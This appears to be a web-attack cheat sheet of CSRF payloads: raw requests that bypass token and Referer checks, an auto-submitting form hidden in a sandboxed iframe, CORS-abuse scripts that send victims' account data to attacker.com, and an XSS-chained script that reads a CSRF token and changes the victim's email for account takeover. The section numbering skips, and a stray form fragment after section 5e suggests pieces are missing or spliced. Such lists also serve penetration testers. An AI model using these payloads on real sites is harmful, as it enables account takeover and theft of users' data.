# ──────────────────────────────────────────
# [4] CSRF TOKEN BYPASS TECHNIQUES
# ──────────────────────────────────────────
# 4a: Remove the token entirely
POST /action HTTP/1.1
Host: TARGET
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded

param=evil_value
# (csrf_token parameter omitted)

# 4b: Use empty token value
csrf_token=&param=evil_value

# 4c: Use null token
csrf_token=null&param=evil_value
csrf_token=undefined&param=evil_value
csrf_token=0&param=evil_value

# 4d: Use attacker's own CSRF token (if validation not tied to session)
csrf_token=ATTACKER_OWN_VALID_TOKEN&param=evil_value

# 4e: Method override (POST→GET conversion)
GET /action?param=evil_value&csrf_token=anything HTTP/1.1

# 4f: Change Content-Type to bypass token check
Content-Type: application/json
{"param": "evil_value"}

# 4g: HTTP method override headers
POST /action HTTP/1.1
X-HTTP-Method-Override: PUT

# 4h: Token in wrong parameter (case sensitivity)
CSRF_TOKEN=valid_token&param=evil_value
Csrf-Token=valid_token&param=evil_value
_csrf=valid_token&param=evil_value
csrftoken=valid_token&param=evil_value

# [5] REFERER HEADER BYPASS
# ──────────────────────────────────────────
# 5a: Remove Referer header entirely
Referer: (header removed)

# 5b: Referer contains target domain as subdomain of attacker
Referer: https://TARGET.attacker.com/csrf.html

# 5c: Referer contains target domain as path
Referer: https://attacker.com/https://TARGET/

# 5d: Referer with null origin (data: or sandboxed iframe)
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,
<form action='https://TARGET/action' method='POST'>
  <input name='param' value='evil'>
</form>
<script>document.forms[0].submit()</script>
">
</iframe>

# 5e: Suppress Referer via meta tag
<meta name="referrer" content="no-referrer">

</form>
<script>document.forms[0].submit();</script>

# [7] CORS MISCONFIGURATION → CSRF
# ──────────────────────────────────────────
# If Access-Control-Allow-Origin: * or reflects Origin + Allow-Credentials: true
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://TARGET/api/user-info', true);
xhr.withCredentials = true;
xhr.onload = function() {
  // exfiltrate sensitive data
  fetch('https://attacker.com/?data=' + encodeURIComponent(xhr.responseText));
};
xhr.send();
</script>

# Reflected Origin CORS abuse
<script>
fetch('https://TARGET/api/account', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => fetch('https://attacker.com/?leak=' + JSON.stringify(data)));
</script>

# ──────────────────────────────────────────
# [12] CSRF CHAINED WITH XSS (Full ATO)
# ──────────────────────────────────────────
# XSS reads CSRF token, then submits CSRF request
<script>
fetch('/account/settings', {credentials:'include'})
  .then(r => r.text())
  .then(html => {
    var token = html.match(/csrf[_-]?token['"]\s*value=['"]([^'"]+)/i)[1];
    return fetch('/account/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'email=attacker%40evil.com&csrf_token=' + token
    });
  });
</script>
